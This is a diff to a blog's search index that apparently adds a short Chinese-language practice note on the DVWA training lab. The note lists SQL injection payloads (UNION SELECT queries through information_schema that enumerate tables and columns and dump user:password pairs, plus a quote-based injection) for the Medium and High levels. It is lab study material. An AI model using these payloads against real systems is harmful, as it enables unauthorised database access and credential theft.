@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>DVWA</title>
+      <link href="/categories/%E9%9D%B6%E5%9C%BA/DVWA/"/>
+      <url>/categories/%E9%9D%B6%E5%9C%BA/DVWA/</url>
+      
+        <content type="html"><![CDATA[<p>dvwa靶场练习</p><a id="more"></a><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">爆库，表</span><br><span class="line">id&#x3D;0 union select database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() %23 &amp;Submit&#x3D;Submit</span><br><span class="line">爆字段名，此处的users转换为hex</span><br><span class="line">id&#x3D;0 union select database(),group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273 %23 &amp;Submit&#x3D;Submit</span><br><span class="line">爆字段值</span><br><span class="line">id&#x3D;0 union select database(),group_concat(user,0x3a,password) from dvwa.users %23 &amp;Submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>post报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">0&#39; union select database(),2 and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 靶场 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>就差一把钥匙</title>
       <link href="/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/"/>
       <url>/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/</url>
